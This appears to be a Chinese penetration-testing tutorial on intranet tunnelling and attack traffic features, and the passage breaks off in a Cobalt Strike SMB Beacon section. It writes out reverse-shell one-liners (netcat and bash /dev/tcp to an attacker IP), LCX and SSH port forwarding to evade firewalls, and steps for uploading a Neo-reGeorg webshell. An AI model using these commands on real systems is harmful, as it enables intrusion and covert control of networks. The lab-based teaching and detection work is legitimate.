---
title: 内网隧道搭建及攻击流量特征概述，万字解说
url: https://mp.weixin.qq.com/s/FsPo_565I6jr7SxMUunUgw
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T05:01:54.300430
---

# 内网隧道搭建及攻击流量特征概述，万字解说

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Pled5HYvsFGOxx4fRDSsfMp5P6vJ8psfUHd966ibE68P5Q8BwGZxib72mXOvCnaODQ0kHKIppcNZupD1W3Of6QzKibiaVAuuljy5kcwHItUc8sE/0?wx_fmt=jpeg)

# 内网隧道搭建及攻击流量特征概述，万字解说

暖阳春草
暖阳春草

只会看监控的实习生

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

关于隧道的分类大体可以从两个方面进行分类

如果是从流量层分类

**1、应用层隧道（DNS HTTP SSH）**

**2、传输层隧道（TCP隧道 UDP隧道）**

**3、网络层隧道（ICMP隧道 IPv6隧道）**

如果从作用上来分类

**1、反弹SHELL（nc python bash）**

**2、端口转发（LCX SSH iptables telnet）**

**3、端口映射（LCX NPS FRP）**

**3、正向代理 (EW NSP FRP)**

**4、反向代理 (EW NSP FRP)**

**端口转发和端口映射**

**端口转发,有时被称为做隧道**,是安全壳( SSH)为网络安全通信使用的一种方法简单来说,端口转发就是将

一个端口收到的流量转发到另一个端口。

**端口映射是 NAT的一种,功能是把在公网的地址转成私有地址。简单来说,端口映射就是将一个端口映射**

**到另一个端口供其他人使用**

**Http代理和Socks代理（隧道）**

**Http代理用的是Http协议，工作在应用层**，主要是用来代理浏览器访问网页。

**Socks代理用的是Socks协议，工作在会话层**，主要用来传递数据包。socks代理又分为Socks4和

Sock5，**Socks4只支持TCP，而Socks5支持TCP和UDP。**

## 端口转发

### **LCX端口转发**（反向代理）

端口转发：

Lcx -listen <监听slave请求的端口><等待连接的端口>

Lcx -slave <攻击机IP><监听端口><目标IP><目标端口>

端口映射：

Lcx -tran<等待连接的端口><目标IP><日标端口>

由于配置了防火墙只允许web访问，这个时候攻击者想访问3389端口，远程连接是不可以的，就需要使

用LCX进行端口转发

Web服务器开启了80端口，**3389端口不允许出网，可以将web服务器的3389端口转发到允许出网的53**

**端口，这个时候攻击者在本地监听53端口并且转发到1111端口，这个时候攻击者连接自己的1111端**

**口，等于访问web服务器的3389端口（也可以搭公网的vps服务器）**

**注意：这里的攻击机和靶机都是在内网中，只不过靶机3389端口不出网，攻击机（跳板机）53端口出网**

1、在攻击机器上运行以下命令，监听本地53端口并且转发到本地1111端口

lcx -listen 53 1111

2、在web靶机上运行以下命令， 将本地的3389端口转发到192.168.3.27的 53端口

lcx.exe -slave 192.168.3.27 53 127.0.0.1 3389

3、在攻击机器上运行远程桌面，地址为127.0.0.1:1111

### **使用SSH端口转发**（正向代理）

SSH通过网络远程访问主机提供保护，可以对客户端和服务端之间的数据传输进行压缩和加密，有身份

验证、SCP、SFTP、和端口转发的功能

ssh -CfNg -L 本地端口:主机B\_IP:主机B\_端口 跳板主机A\_IP

例如： ssh -CfNg -L 3333:192.168.52.135:3389 192.168.41.136,然后输入151的密码即可

访问跳板机器的3333端口就可以访问内网机器的3389端口

B可以访问A

B可以访问C

A访问不了B

ssh -CfNg -R 攻击者端口:目标主机IP:目标主机端口 -fN 攻击者\_IP

在攻击的机器上访问端口就可以了（这里只能本地访问）

## 反弹连接

### **Netcat反弹Shell**

**Netcat简称NC,是一个简单、可靠的网络工具,被誉为网络界的瑞士军刀。通NC可以进行端口扫描、**

**反弹Shell、端口监听和文件传输等操作,常用参数如下：**

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEJLia7B4cLPqEjXrTtZBPOolT9PfeoIah0ficaiblDHGz9t4xZtpibrfKGQIX3XuiamEpnSBz3ePKFZvm7fE499ssaSXHc8kwO4pHA/640?wx_fmt=png&from=appmsg)

#### 正向shell

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHThNNm3cFgpF4XhblCgGq6RyGV0tzXeic0iaXaXe8M0LYqHljhl32E1PlTicnrvYbGdL5iaOQicB8EfUjRfQuoYcdibHSqbbTWk8mw8/640?wx_fmt=png&from=appmsg)

**靶机上运行**

**nc -lvvp 1111 -e C:\Windows\System32\cmd.exe windows机器**

**nc -lvvp 1111 -e /bin/bash linux机器**

**在攻击机上运行**

**nc 192.168.3.29 1111**

**拿到正向的shell**

#### **反向反弹Shell**

攻击者机器 192.168.3.27不能直接访问靶机，但是靶机 192.168.3.29可以访问攻击者的机器，

这个时候使用反向shell

在攻击者机器运行：nc -lvvp 1111 监听1111端口

**在靶机上运行 （反弹到公网）**

**nc -e C:\Windows\System32\cmd.exe 192.168.3.27 1111 windos机器**

**nc -e /bin/bash 192.168.3.27 1111 linux机器**

#### **PowerCat反弹Shell**

**PowerCat是一个powershell写的tcp/ip瑞士军刀，看一看成ncat的powershell的实现，然后里面也**

**加入了众多好用的功能，如文件上传，smb协议支持，中继模式，生成payload，端口扫描等等。**

**PowerCat命令**

-l监听连接

-c连接到侦听器

-p要连接或监听的端口

-e执行

-ep执行Powershell

-r中继。格式：“-r tcp：10.1.1.1：443”

-u通过UDP传输数据

-dns通过dns传输数据

-dnsft DNS故障阈值

-t超时选项。默认值：60

-I输入：文件路径（字符串），字节数组或字符串

-o控制台输出类型：“主机”，“字节”或“字符串”

-of输出文件路径

-d连接后断开连接

-rep中继器。断开连接后重新启动

-g生成有效载荷

-ge生成编码的有效载荷

-h打印帮助消息

#### **Bash反弹shell**

**Bash介绍**

Shell也称为终端或壳，是人与内核之间的翻译官，而Bash则是Linux中默认使用的Shell

Bash 反弹Shell的命令如下：

bash -i >&/dev/tcp/攻击机\_IP/攻击机端口 0>&1

bash -i >&/dev/tcp/攻击机\_IP/攻击机端口 0>&2

bash -i >&/dev/udp/攻击机\_IP/攻击机端口 0>&1

bash -i >&/dev/udp/攻击机\_IP/攻击机端口 0>&2

**"bash-i"是指打开一个交互式的Shell。**

**"&"符号用于区分文件和文件描述符，">&"符号后面跟文件时，表示将标准输出和标准错误输出重**

**定向至文件，">&"符号后面跟数字时表示后面的数字是文件描述符，不加"&"符号则会把后面的数**

**字当成文件。数字"0","1","2"是LinuxShell下的文件描述符， “0”是指标准输入重定向， “1”是**

**指标准输出重定向， “2”是指错误输出重定向。**

"/dev"目录下"tcp"和"udp"是Linux中的特殊设备，可用于建立Socket连接，读写这俩文件就相当

于是在Socket连接中传输数据。">&/dev/tcp/攻击机\_ip/攻击机端口"则表示将标准输出和标准错误

输出重定向到"/dev/tcp/攻击机ip/攻击机端口"文件中，也就是重定向到了攻击机，这时目标机的命

令执行结果可以从攻击机看到。"0>&1"或"0>&2"又将标准输入重定向到了标准输出，而标准输出

重定向到了攻击机，因此标准输入也就重定向到了攻击机，从而可以通过攻击机输入命令，并且可以

看到命令执行结果输出

**攻击机器使用nc执行监听命令**

nc -lvvp 9999 监听 TCP

nc -lup 9999 监听UDP

**实验靶机执行连接命令**

bash -i >&/dev/tcp/192.168.3.27/9999 0>&1

#### **Python 反弹Shell**

执行python脚本

## **内网代理**

内网资产扫描这种场景一般是进行内网渗透才需要的代理技术，如果你不打内网一般是不需要这种技术的，内网代理技术一般也是采用**http或者socks**代理

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFExI5kORqPSpfU9DzFUc5VGgbtp5iciacAaswHwSoCoUgNhicXqhH0SBxZsGZicjwOvDd8JBpmmEUERtR7SqB0FNQtbjxiblpHPE3gA/640?wx_fmt=png&from=appmsg)针对以上的情况我们需要如何对内网进行扫描呢？

1、直接使用web服务进行扫描（这种方式请看内网渗透）

2、做代理让web服务成为代理机器

针对于内网的机器要考虑是用代理隧道还是使用端口转发

使用代理一般是用http代理或者socks代理代理后的拓扑如下

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFJwuORvpwhX88vGHjhVGxicPWXzicIDjxxlffQXczzpklKvaSCzoYZ6nicMIDhmd3Rgcm52PY1MJrrPUK9O1Da1yzicjiaVXibuuQl8/640?wx_fmt=png&from=appmsg)

### **代理连接工具**

**windows工具**

如果是windows是**proxyifile**工具

**linux工具**

linux工具下一般使用命令行工具

**ew工具**

**FRP(服务端搭在公网攻击者机器)**

**NPS使用**

### **ICMP隧道（端口转发）**

**ICMP介绍**

ICMPInternet控制报文协议。它**是TCP/IP协议簇的一个子协议**，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用

主要概念有：

1.确认ip数据包是否成功到达目的地

2.通知源主机发送ip数据包丢失的原因

**3.ICMP是基于IP协议工作的**

**4.ICMP只能作用于IPV4，IPV6下，**

ICMP 报文的种类有两种,即 ICMP 差错报告报文和 ICMP 询问报文

**ICMP隧道原理**由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性。**把数据隐藏在ICMP数据包包头的data字段中，建立隐蔽通道。实现绕过防火墙和入侵检测系统的阻拦。**

**1.ICMP隐蔽传输是无连接的，传输不是很稳定，而且隐蔽通道的带宽很低**

**2.利用隧道传输时，需要接触更低层次的协议，这就需要高级用户权限**

反弹shell进行连接

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFz3icHM0Vl0ice3h181XQHWbAZFXycw8B3zBGMhXSphvRibS9cDpjY53fvW9LJAFdSj89icIzib0ww6nJ7pJ5aLnGUicqJ9mMdoxnibg/640?wx_fmt=png&from=appmsg)

ICMP可以用作反弹shell，也可以用作隧道,这里我们使用工具:pingtunnel

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFF9CMPtf1LUlumf44uZzI09cgdfHqQw02bIAWLKQicibqiavHYN5rwQUpIEqSeVpD8Hy6cX2KPnTs9XBHJlibtDQYG0Zmshrtp9EAg/640?wx_fmt=png&from=appmsg)

### **DNS隧道**

域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映

射的一个分布式数据库，能够使人更方便地访问互联网。**DNS使用TCP和UDP端口53。**

请求数据包

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFVh8iaTYZJg2hmLM4YXLia0TmIsDoMatdQLLgG9xicutPt2yJX5y5pac2gW7QBLVRibVUGgVfxer69qI82l9k9eJ7Rtiabpv8uA39g/640?wx_fmt=png&from=appmsg)

返回数据包

一般DNS隧道中通信的内容隐藏在请求区域和回答区域中，可能在不同的type类型中隐藏的地方不同

**DNS隧道流量分析**

我们搭建一个简单的DNS的隧道用于反弹shell

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGlpR9WQJPvFLNfnlTwyAwiauoHoeFicaec1rrpzNXcrzLdPkUdsHJrhxwB8TJ3Pm82CPoxCPJiclhlKxJOrXh0GPqw9cicBvHJM4Q/640?wx_fmt=png&from=appmsg)

通过分析发现DNS请求类型是TXT，为某个主机名或域名设置的说明。并且域名的有所变化，通过观看

应该是16进制加密的，分期其中一段为（C:\Users\Ad.ministrator>.pc.test）

### 上线不出网

#### 正向代理隧道

一般不出网的情况分为几种，第一种就是通过漏洞获得目标机器权限，然后发现此机器不出网，不出网其实意味着对方靶机在内网无法访问你，无法将流量带出来，其实这种情况绕过的方式也有挺多的，我们今天就只从代理隧道的层面来讲讲怎么去搭建，其实这时候往往就需要通过一个正向代理的方式去进行一个隧道搭建。

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEVicr681kVckCXHicD96FibxjbfK23WTL4RicibgiavZKBt9qiadFiajoRAM9CBNMoRvXXTOewJ5xYiaZXsukkBMVUxs4XrMBCCvFLPqZM/640?wx_fmt=png&from=appmsg)

不出网意味着对方不能来访问你，那么像之前提到的反向代理隧道类似的就不能用，但是反过来我们就可以去连接对方，也就是常说的正向代理隧道，例如ssh隧道或者Neo-reGeorg等正向代理工具的使用。

这里推荐Neo-reGeorg，

https://github.com/L-codes/Neo-reGeorg

这个工具其实就是我们用neoreg.py生成一个webshell上传到对方靶机上，这时我们Neo-reGeorg客户端去连接webshell他就会在本地自动的开启一个隧道

1. 生成webshell代理脚本

python3 neoreg.py generate -k password(密码自定义)

2. 将代理脚本上传到目标服务器，web可访问的目录。
3. 连接代理脚本：

python3 neoreg.py -k password -u

http://xx/xx.php（脚本地址）

#### 多层代理隧道

第二种上线不出网情况是指存在一台中转机器，这台机器出网，这种是最常见的情况。经常是拿下一台边缘机器，其有多块网卡，内网机器都不出网。这种情况下拿这个边缘机器做中转，就可以上线。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHv7OLtR9BKbUYOibHa2icuQ2rN9S6YichtrjG7MNub09gwIibSBhsIXj7c7afapLGibDicfMWcMlRGdazwdp1m2EFr1tNNqs2zrDGwg/640?wx_fmt=png&from=appmsg)

A区域的机器已经被控制并且上线到CS,现在要将B区域的机器进行上线，有如下的形式

##### SMB Beacon上线

**介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。**

**通信网络拓扑如下：**

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGtyvfZias36zDTG0r9pTaSQZ5oqLEW9aXibGBibh4v1gaRCzPp25Y9v2Twotictgm7mnqIhnmnNQNpMJQrRFRWdicIl8ic0iaJ0whtb0/640?wx_fmt=png&from=appmsg)

**实验步骤如下：**

**1、首先控制A区域的边界主机，使用CS*...